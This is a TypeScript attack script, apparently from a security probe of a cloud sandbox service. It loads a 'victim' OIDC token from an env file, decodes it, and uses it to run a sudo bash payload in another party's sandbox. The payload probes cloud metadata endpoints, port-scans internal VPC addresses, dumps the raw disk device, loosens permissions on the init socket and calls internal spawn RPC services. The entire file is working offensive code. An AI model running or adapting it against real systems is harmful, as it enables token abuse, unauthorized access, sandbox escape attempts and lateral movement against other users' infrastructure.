import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadEnv(file: string): Record<string, string> {
  const out: Record<string, string> = {};
  for (const line of readFileSync(file, "utf8").split("\n")) {
    const m = line.match(/^([A-Z_]+)=(.*)$/);
    if (m) out[m[1]] = m[2].trim();
  }
  return out;
}
const VICTIM = loadEnv("/tmp/vercel-sandbox/victima/.env.local").VERCEL_OIDC_TOKEN!;
const V = JSON.parse(Buffer.from(VICTIM.split(".")[1], "base64url").toString());

const SCRIPT = `
echo "===== metadata raw TCP ====="
for hp in 169.254.169.254:80 169.254.169.254:443 169.254.170.2:80 169.254.170.2:443 169.254.169.253:80; do
  ip=\${hp%:*}; p=\${hp#*:}
  (timeout 3 bash -c "echo > /dev/tcp/$ip/$p" 2>/dev/null && echo "$hp OPEN") || echo "$hp closed/filtered"
done
echo "--- IMDS via Host header ---"
curl -sv -m 4 -H "Host: 169.254.169.254" http://169.254.169.254/latest/meta-data/ 2>&1 | tail -6
echo "===== VPC TCP scan (common ports) ====="
for ip in 172.31.0.1 172.31.0.2 172.31.16.1 172.31.32.1 172.31.0.10 172.31.0.20 172.31.1.10; do
  for p in 22 443 5432 6379 2379 8000 8080 3000 9092 2181 53; do
    (timeout 1 bash -c "echo > /dev/tcp/$ip/$p" 2>/dev/null && echo "$ip:$p OPEN")
  done
done
echo done-scan
echo "===== read /dev/vda ====="
dd if=/dev/vda bs=4096 count=1 2>/dev/null | od -A x -t x1z | head -5
echo "--- dd full first 16MB strings (via od) ---"
dd if=/dev/vda bs=4096 count=4096 2>/dev/null | od -c | head -40
echo "===== init.sock probe (ConnectRPC) ====="
which socat nc ncat 2>/dev/null
python3 - <<'PYEOF'
import socket, os
try:
    os.chmod("/run/vercel/share", 0o777)
    os.chmod("/run/vercel/share/init.sock", 0o777)
except Exception as e:
    print("chmod:", e)
# ConnectRPC unary: POST /<proto>/Ping with JSON
for path in ["/vercel.sandbox.spawn.v1.SpawnService/Ping", "/vercel.sandbox.spawn.v1.SpawnService/Spawn", "/vercel.sandbox.spawn.v1.SpawnService/", "/grpc.health.v1.Health/Check"]:
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect("/run/vercel/share/init.sock")
        body = "{}"
        req = f"POST {path} HTTP/1.1\r\nHost: localhost\r\nContent-Type: application/json\r\nContent-Length: {len(body)}\r\n\r\n{body}"
        s.sendall(req.encode())
        data = s.recv(8192)
        print(f"--- {path} ---")
        print(data[:2000])
        s.close()
    except Exception as e:
        print(f"--- {path} --- ERR {e}")
PYEOF
echo "===== connect to TCP 23456/30001/30002 ConnectRPC ====="
python3 - <<'PYEOF'
import socket
for port in [23456, 30001, 30002]:
    for path in ["/vercel.sandbox.spawn.v1.SpawnService/Ping", "/"]:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect(("127.0.0.1", port))
            body = "{}"
            req = f"POST {path} HTTP/1.1\r\nHost: localhost\r\nContent-Type: application/json\r\nContent-Length: {len(body)}\r\n\r\n{body}"
            s.sendall(req.encode())
            data = s.recv(8192)
            print(f"--- {port}{path} ---")
            print(data[:1500])
            s.close()
        except Exception as e:
            print(f"--- {port}{path} --- ERR {e}")
PYEOF
echo DONE
`;

async function main() {
  const sbx = await Sandbox.get({ name: "victim-np", token: VICTIM, teamId: V.owner_id, projectId: V.project_id });
  const res = await sbx.runCommand("bash", ["-c", SCRIPT], { sudo: true, wait: true, timeout: 120_000 });
  console.log("exit:", res.exitCode);
  console.log(await res.output("both"));
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });